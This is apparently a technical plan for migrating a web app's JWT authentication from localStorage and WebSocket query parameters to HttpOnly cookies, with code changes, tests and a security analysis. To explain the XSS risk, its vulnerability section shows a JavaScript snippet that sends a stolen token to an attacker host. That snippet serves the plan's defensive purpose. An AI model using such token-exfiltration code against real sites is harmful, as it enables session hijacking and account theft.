# Migration Plan: localStorage JWT → HttpOnly Cookie Authentication

## Current State Analysis

### What Works Today

**Backend:**
- ✅ Login endpoint sets HttpOnly cookie AND returns token in response body
- ✅ HTTP API endpoints use `get_current_user(access_token: Cookie(None))` - reads from cookie
- ✅ WebSocket endpoint reads token from query parameter: `/ws/{project_id}?token={jwt}`
- ✅ CORS configured with `allow_credentials=True`
- ✅ Cookie settings: `httponly=True, secure=False, samesite="lax"`

**Frontend:**
- ✅ HTTP API uses `credentials: 'include'` - sends cookies automatically
- ⚠️ Login stores token in localStorage from response body
- ⚠️ WebSocket reads token from localStorage and passes as query parameter
- ✅ All HTTP requests work via cookie authentication

### Critical Discovery

**The backend ALREADY uses HttpOnly cookies for HTTP API authentication!**

The issue is that the frontend is **also** storing the token in localStorage (unnecessarily) and using it for WebSocket connections. The HTTP API doesn't need or use the localStorage token at all.

### Security Vulnerabilities in Current Implementation

#### 1. **XSS Attack Surface (High Risk)**
```javascript
// Attacker can steal token via XSS
const token = localStorage.getItem('access_token');
fetch('https://attacker.com/steal', { body: token });
```

#### 2. **Token Leakage in Logs (Medium Risk)**
WebSocket URL: `ws://localhost:8001/ws/project-id?token=eyJhbGc...`
- Visible in browser history
- Logged by proxies, load balancers
- Visible in browser DevTools Network tab
- Captured in server access logs

#### 3. **Token Exposure in Memory (Low Risk)**
- Token stored in localStorage persists across sessions
- Visible in browser storage inspector
- Can be extracted via browser extensions

## Migration Strategy

### Phase 1: WebSocket Cookie Authentication (Primary Change)

**Goal:** Remove token from WebSocket query parameter, use cookie instead.

**Changes Required:**

1. **Backend - Update WebSocket endpoint to read token from Cookie header**
2. **Frontend - Remove localStorage token storage**
3. **Frontend - Update WebSocket to rely on automatic cookie inclusion**

### Phase 2: Harden Cookie Security Settings

**Goal:** Improve cookie security for production deployment.

**Changes Required:**

1. **Backend - Add environment-based cookie configuration**
2. **Backend - Implement SameSite=Strict for production**
3. **Backend - Add Secure flag for HTTPS environments**

### Phase 3: Add CSRF Protection (Optional for SameSite=Strict)

**Note:** With `SameSite=Strict`, CSRF attacks are already prevented. This phase is optional additional defense-in-depth.

## Detailed Implementation Plan

### Backend Changes

#### File 1: `backend/app/realtime/websocket.py`

**Current Implementation:**
```python
@router.websocket("/ws/{project_id}")
async def websocket_endpoint(
    websocket: WebSocket,
    project_id: str,
    token: str = Query(...),  # ← Token from query parameter
    db: Session = Depends(get_db)
):
    user = await get_user_from_token(token, db)
    # ...
```

**New Implementation:**
```python
@router.websocket("/ws/{project_id}")
async def websocket_endpoint(
    websocket: WebSocket,
    project_id: str,
    db: Session = Depends(get_db)
):
    # Extract token from Cookie header
    cookie_header = websocket.headers.get("cookie", "")
    token = None
    
    # Parse cookies (format: "key1=value1; key2=value2")
    for cookie in cookie_header.split(";"):
        cookie = cookie.strip()
        if cookie.startswith("access_token="):
            token = cookie.split("=", 1)[1]
            break
    
    if not token:
        await websocket.close(code=1008, reason="Authentication required")
        logger.warning(f"WebSocket connection rejected: No token in cookies")
        return
    
    # Authenticate user (existing logic)
    user = await get_user_from_token(token, db)
    if not user:
        await websocket.close(code=1008, reason="Authentication failed")
        return
    
    # Rest remains the same...
```

**Impact:**
- ✅ Token no longer in URL
- ✅ Uses same authentication mechanism as HTTP API
- ✅ Browser automatically includes cookies in WebSocket handshake
- ⚠️ Breaks existing WebSocket connections until frontend updated

#### File 2: `backend/app/api/auth.py`

**Current Implementation:**
```python
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,
    secure=False,  # Set to True in production with HTTPS
    samesite="lax",
    max_age=60 * 60 * 24 * 7  # 7 days
)
```

**New Implementation (with environment-based configuration):**
```python
# Determine cookie settings based on environment
is_production = settings.ENVIRONMENT == "production"
secure_cookie = is_production  # Only use Secure in production (HTTPS)
samesite_policy = "strict" if is_production else "lax"

response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,              # Cannot be accessed by JavaScript
    secure=secure_cookie,       # Only sent over HTTPS in production
    samesite=samesite_policy,   # Strict in prod, Lax in dev
    max_age=60 * 60 * 24 * 7,   # 7 days
    path="/",                   # Available for all paths
    domain=None                 # Same origin only
)
```

**Impact:**
- ✅ Stronger CSRF protection in production (SameSite=Strict)
- ✅ Secure flag in production prevents cookie theft over HTTP
- ✅ Development remains functional over HTTP
- ✅ No breaking changes for HTTP API

#### File 3: `backend/app/core/config.py`

**Add cookie configuration:**
```python
class Settings(BaseSettings):
    # ... existing fields ...
    
    # Cookie settings
    COOKIE_SECURE: bool = False  # Override in production
    COOKIE_SAMESITE: str = "lax"  # Override in production to "strict"
    COOKIE_MAX_AGE: int = 60 * 60 * 24 * 7  # 7 days
    
    def get_cookie_secure(self) -> bool:
        """Get secure cookie flag based on environment"""
        if self.ENVIRONMENT == "production":
            return True
        return self.COOKIE_SECURE
    
    def get_cookie_samesite(self) -> str:
        """Get SameSite policy based on environment"""
        if self.ENVIRONMENT == "production":
            return "strict"
        return self.COOKIE_SAMESITE
```

**Impact:**
- ✅ Centralized cookie configuration
- ✅ Environment-specific security settings
- ✅ Easy to override for testing

### Frontend Changes

#### File 1: `frontend/src/stores/authStore.ts`

**Current Implementation:**
```typescript
export const useAuthStore = create<AuthState>((set, get) => ({
  token: localStorage.getItem('access_token'),  // ← Remove this
  
  setToken: (token) => {  // ← Remove this method
    if (token) {
      localStorage.setItem('access_token', token);
    } else {
      localStorage.removeItem('access_token');
    }
    set({ token });
  },
  
  getToken: () => {  // ← Remove this method
    return get().token;
  },
  
  login: async (username, password) => {
    const response = await authApi.login({ username, password });
    if (response.access_token) {
      get().setToken(response.access_token);  // ← Remove this
    }
    const user = await authApi.getCurrentUser();
    set({ user, isAuthenticated: true });
  },
  
  logout: async () => {
    await authApi.logout();
    get().setToken(null);  // ← Remove this
    set({ user: null, isAuthenticated: false });
  },
}));
```

**New Implementation:**
```typescript
interface AuthState {
  user: User | null;
  isLoading: boolean;
  isAuthenticated: boolean;
  // Remove: token, setToken, getToken
  
  setUser: (user: User | null) => void;
  loadUser: () => Promise<void>;
  login: (username: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
  register: (data: RegisterData) => Promise<void>;
}

export const useAuthStore = create<AuthState>((set) => ({
  user: null,
  isLoading: true,
  isAuthenticated: false,

  setUser: (user) => set({ 
    user, 
    isAuthenticated: !!user,
    isLoading: false 
  }),

  loadUser: async () => {
    try {
      const user = await authApi.getCurrentUser();
      set({ user, isAuthenticated: true, isLoading: false });
    } catch (error) {
      set({ user: null, isAuthenticated: false, isLoading: false });
    }
  },

  login: async (username, password) => {
    await authApi.login({ username, password });
    // Token is now only in HttpOnly cookie - don't store it
    const user = await authApi.getCurrentUser();
    set({ user, isAuthenticated: true });
  },

  logout: async () => {
    await authApi.logout();
    set({ user: null, isAuthenticated: false });
  },

  register: async (data) => {
    await authApi.register(data);
  },
}));
```

**Impact:**
- ✅ Removes XSS vulnerability (no token in localStorage)
- ✅ Simplifies code (less state management)
- ✅ Authentication relies solely on HttpOnly cookies
- ⚠️ Requires users to clear localStorage and login again

#### File 2: `frontend/src/services/websocket.ts`

**Current Implementation:**
```typescript
connect(projectId: string, token: string) {  // ← Remove token parameter
  // ...
  const url = `${WS_URL}/ws/${projectId}?token=${encodeURIComponent(token)}`;
  this.ws = new WebSocket(url);
  // ...
}
```

**New Implementation:**
```typescript
connect(projectId: string) {  // No token parameter
  if (this.ws?.readyState === WebSocket.OPEN && this.projectId === projectId) {
    return;
  }

  this.disconnect();
  this.projectId = projectId;
  this.isIntentionallyClosed = false;

  // Browser automatically includes cookies in WebSocket handshake
  const url = `${WS_URL}/ws/${projectId}`;
  this.ws = new WebSocket(url);

  // ... rest of implementation unchanged
}
```

**Impact:**
- ✅ Token no longer in URL
- ✅ Relies on browser's automatic cookie handling
- ✅ Simpler API (one less parameter)
- ✅ More secure (token not exposed in URL)

#### File 3: `frontend/src/features/board/BoardPage.tsx`

**Current Implementation:**
```typescript
const { getToken } = useAuthStore()  // ← Remove this

useEffect(() => {
  const setupWebSocket = async () => {
    try {
      const token = getToken()  // ← Remove this
      
      if (token) {  // ← Remove this check
        wsService.connect(projectId, token)  // ← Change this
        // ...
      }
    }
  }
}, [projectId, queryClient, getToken])  // ← Remove getToken dependency
```

**New Implementation:**
```typescript
// Remove: const { getToken } = useAuthStore()

useEffect(() => {
  if (!projectId) return

  const setupWebSocket = async () => {
    try {
      console.log('Connecting WebSocket to project:', projectId)
      wsService.connect(projectId)  // No token parameter
      
      const unsubscribe = wsService.onMessage((message) => {
        console.log('Received WebSocket message:', message)
        if (['task_created', 'task_updated', 'task_deleted', 'task_moved'].includes(message.type)) {
          queryClient.invalidateQueries({ queryKey: ['tasks', projectId] })
        }
      })

      return () => {
        unsubscribe()
        wsService.disconnect()
      }
    } catch (error) {
      console.error('WebSocket setup failed:', error)
    }
  }

  setupWebSocket()
}, [projectId, queryClient])  // No getToken dependency
```

**Impact:**
- ✅ Cleaner code (less complexity)
- ✅ Authentication handled automatically by browser
- ✅ Maintains all existing functionality

### Test Changes

#### File: `backend/tests/test_websocket_realtime.py`

**Current Implementation:**
```python
with client.websocket_connect(f"/ws/{project_data['id']}?token={token}") as websocket:
```

**New Implementation:**
```python
# TestClient automatically includes cookies set by login endpoint
with client.websocket_connect(f"/ws/{project_data['id']}") as websocket:
```

**Impact:**
- ✅ Tests become simpler (no token management)
- ✅ Tests more accurately reflect browser behavior
- ✅ All 6 WebSocket tests will continue to pass

## Security Analysis

### CSRF Protection

**Current State:**
- Cookie setting: `samesite="lax"`
- Protection: Moderate (prevents most CSRF attacks)

**After Migration:**
- Production: `samesite="strict"`
- Development: `samesite="lax"` (for cross-origin dev setup)
- Protection: Strong (prevents all CSRF attacks)

**SameSite=Strict Behavior:**
- Cookie only sent to same origin
- Cross-site requests (including from bookmarks) don't send cookie
- Protects against CSRF without additional tokens

**Trade-offs:**
- ✅ Strong CSRF protection
- ⚠️ Users clicking email links may need to login again (cookie not sent on initial cross-site navigation)
- ✅ Normal usage (typing URL, refreshing page) works fine

### Secure Cookie Flag

**Current State:**
- `secure=False` for development (HTTP)

**After Migration:**
- Production: `secure=True` (requires HTTPS)
- Development: `secure=False` (allows HTTP)

**Impact:**
- ✅ Prevents cookie theft via man-in-the-middle on HTTP
- ✅ Forces HTTPS in production
- ✅ Development over HTTP remains functional

### WebSocket Origin Validation

**Current State:**
- No explicit origin validation in WebSocket endpoint

**Recommendation (Optional Enhancement):**
```python
@router.websocket("/ws/{project_id}")
async def websocket_endpoint(
    websocket: WebSocket,
    project_id: str,
    db: Session = Depends(get_db)
):
    # Validate origin
    origin = websocket.headers.get("origin")
    allowed_origins = settings.get_cors_origins_list()
    
    if origin and origin not in allowed_origins:
        await websocket.close(code=1008, reason="Invalid origin")
        logger.warning(f"WebSocket rejected from origin: {origin}")
        return
    
    # Rest of implementation...
```

**Impact:**
- ✅ Prevents WebSocket connections from unauthorized origins
- ✅ Additional layer of security beyond cookie SameSite
- ⚠️ May break legitimate use cases if not configured correctly

### Authorization

**Current State:**
- ✅ WebSocket validates user has access to project via workspace membership
- ✅ Uses same `check_workspace_access()` as HTTP API
- ✅ Proper role-based access control

**After Migration:**
- ✅ No changes needed (authorization logic unchanged)
- ✅ Authentication method change doesn't affect authorization

## Impact Analysis

### Login Flow

**Current:**
1. User submits credentials
2. Backend validates and creates JWT
3. Backend sets HttpOnly cookie
4. Backend returns JWT in response body
5. Frontend stores JWT in localStorage
6. Frontend fetches user data (using cookie)

**After Migration:**
1. User submits credentials
2. Backend validates and creates JWT
3. Backend sets HttpOnly cookie (with stricter settings)
4. Backend returns JWT in response body (ignored by frontend)
5. ~~Frontend stores JWT in localStorage~~ ← Removed
6. Frontend fetches user data (using cookie)

**Impact:**
- ✅ No user-facing changes
- ✅ Existing sessions will continue working (cookie already set)
- ⚠️ Users will need to clear localStorage (old token no longer used)

### Logout Flow

**Current:**
1. Frontend calls logout endpoint
2. Backend deletes HttpOnly cookie
3. Frontend removes token from localStorage
4. Frontend clears user state

**After Migration:**
1. Frontend calls logout endpoint
2. Backend deletes HttpOnly cookie
3. ~~Frontend removes token from localStorage~~ ← Removed
4. Frontend clears user state

**Impact:**
- ✅ No user-facing changes
- ✅ Cleaner (less state to manage)

### Session Persistence

**Current:**
- Cookie: 7 days
- localStorage: Until manually cleared
- Session persists across browser restarts

**After Migration:**
- Cookie: 7 days (unchanged)
- localStorage: Not used
- Session persists across browser restarts (same behavior)

**Impact:**
- ✅ No change in session behavior
- ✅ Users remain logged in for 7 days

### WebSocket Reconnection

**Current:**
1. Connection lost
2. Frontend attempts reconnect with exponential backoff
3. Frontend reads token from localStorage
4. Frontend connects to `/ws/{project}?token={jwt}`
5. Backend validates token from query parameter

**After Migration:**
1. Connection lost
2. Frontend attempts reconnect with exponential backoff
3. ~~Frontend reads token from localStorage~~ ← Removed
4. Frontend connects to `/ws/{project}` (no token parameter)
5. Backend reads token from Cookie header
6. Browser automatically includes cookie

**Impact:**
- ✅ Reconnection works automatically (browser handles cookies)
- ✅ No token management needed
- ✅ More reliable (no manual token passing)
- ⚠️ If cookie expires during disconnection, reconnect will fail (expected behavior)

### Multiple Browser Windows

**Current:**
- Each window has own WebSocket connection
- Each reads token from shared localStorage
- Both windows stay synchronized

**After Migration:**
- Each window has own WebSocket connection
- Each uses shared HttpOnly cookie automatically
- Both windows stay synchronized

**Impact:**
- ✅ No change in functionality
- ✅ Same real-time sync across windows
- ✅ More secure (token not exposed to JavaScript)

### Mobile/PWA Considerations

**WebView Apps:**
- ✅ HttpOnly cookies work in WebViews
- ✅ WebSocket with cookies supported
- ✅ No code changes needed

**Native Apps:**
- ⚠️ May need custom WebSocket implementation
- ⚠️ Cookie management differs from browser
- ✅ Current approach (if kept) works fine for native apps

## Migration Execution Plan

### Pre-Migration Checklist

- [ ] Backup production database
- [ ] Test migration in development environment
- [ ] Verify all 44 backend tests pass with changes
- [ ] Verify all 10 frontend tests pass with changes
- [ ] Test manual login/logout flow
- [ ] Test WebSocket connections with 2 browser windows
- [ ] Test session persistence across browser restart
- [ ] Test reconnection after network interruption

### Migration Steps (Zero-Downtime)

#### Step 1: Backend - Add Cookie Support to WebSocket (Backward Compatible)

**Code changes:**
- Update `websocket.py` to try cookie first, fall back to query parameter
- Deploy backend

**Result:**
- ✅ Existing clients continue working (query parameter)
- ✅ New clients can use cookie
- ✅ Zero downtime

#### Step 2: Frontend - Remove localStorage Token

**Code changes:**
- Update `authStore.ts` to remove token storage
- Update `websocket.ts` to not pass token
- Update `BoardPage.tsx` to not read token
- Build and deploy frontend

**Result:**
- ✅ Frontend uses cookie for WebSocket
- ✅ Existing users need to logout/login (clear localStorage)
- ✅ New users work immediately

#### Step 3: Backend - Remove Query Parameter Support

**Code changes:**
- Remove query parameter fallback from `websocket.py`
- Deploy backend

**Result:**
- ✅ Only cookie authentication supported
- ✅ Cleaner code
- ✅ Fully migrated

#### Step 4: Backend - Harden Cookie Security

**Code changes:**
- Update cookie settings for production (Secure, SameSite=Strict)
- Deploy backend

**Result:**
- ✅ Production uses hardened settings
- ✅ Maximum security

### Rollback Plan

**If issues arise after Step 2:**
1. Deploy previous frontend version (uses localStorage)
2. Backend still supports both methods (Step 1)
3. No data loss

**If issues arise after Step 3:**
1. Deploy previous backend version (supports query parameter)
2. Frontend already migrated, works with backend
3. Can re-deploy Step 3 when ready

## Files Requiring Changes

### Backend (3 files)

1. **`backend/app/realtime/websocket.py`**
   - Update WebSocket endpoint to read token from Cookie header
   - Lines changed: ~15-20

2. **`backend/app/api/auth.py`**
   - Update cookie settings (Secure, SameSite based on environment)
   - Lines changed: ~10-15

3. **`backend/app/core/config.py`**
   - Add cookie configuration settings
   - Lines changed: ~15-20

### Frontend (3 files)

1. **`frontend/src/stores/authStore.ts`**
   - Remove token, setToken, getToken
   - Simplify login/logout
   - Lines changed: ~40-50 (mostly deletions)

2. **`frontend/src/services/websocket.ts`**
   - Remove token parameter from connect()
   - Update WebSocket URL construction
   - Lines changed: ~5-10

3. **`frontend/src/features/board/BoardPage.tsx`**
   - Remove getToken usage
   - Update WebSocket connect call
   - Lines changed: ~5-10

### Tests (1 file)

1. **`backend/tests/test_websocket_realtime.py`**
   - Remove token parameter from websocket_connect()
   - Lines changed: ~6 (simple parameter removal)

**Total Files:** 7
**Estimated Lines Changed:** ~110-130
**Complexity:** Low-Medium
**Risk:** Low (backward compatible deployment strategy)

## Testing Strategy

### Unit Tests

**Backend:**
- ✅ All 38 existing tests continue to pass
- ✅ All 6 WebSocket tests updated and passing
- Total: 44 tests

**Frontend:**
- ✅ All 10 existing tests continue to pass
- Need to update: authStore tests (remove token-related tests)
- Total: 8-10 tests (fewer after removing token tests)

### Integration Tests

**Test Scenarios:**
1. Login with cookie authentication ✅
2. HTTP API calls with cookie ✅
3. WebSocket connection with cookie ✅
4. Logout clears cookie ✅
5. Expired cookie returns 401 ✅
6. Multiple simultaneous connections ✅
7. Reconnection after disconnect ✅
8. Session persistence across restart ✅

### Manual Testing Checklist

**Login/Logout:**
- [ ] Login with valid credentials
- [ ] Check cookie is set in browser
- [ ] Verify user data loads
- [ ] Logout clears cookie
- [ ] Cannot access protected endpoints after logout

**WebSocket:**
- [ ] Open project board
- [ ] Check WebSocket connects
- [ ] Verify no token in URL
- [ ] Check cookie sent in handshake (DevTools)
- [ ] Test reconnection after network loss

**Real-Time Sync:**
- [ ] Open two browser windows
- [ ] Drag task in Window 1
- [ ] Verify updates in Window 2
- [ ] Create task in Window 2
- [ ] Verify appears in Window 1

**Security:**
- [ ] Check localStorage is empty
- [ ] Verify cookie has HttpOnly flag
- [ ] Check cookie has Secure flag (production)
- [ ] Verify SameSite=Strict (production)

## Recommendation

**Proceed with migration?**

✅ **YES** - The migration:
- Removes critical XSS vulnerability
- Simplifies code (removes unnecessary localStorage usage)
- Aligns with industry best practices
- Has low risk (backward compatible deployment)
- Improves production security significantly
- Maintains all existing functionality

**Timeline:**
- Development/Testing: 1-2 days
- Deployment: Phased rollout (Step 1 → Step 2 → Step 3)
- Each step can be deployed independently with rollback capability

**Priority:** High - Security vulnerability should be addressed before production deployment with real user data.
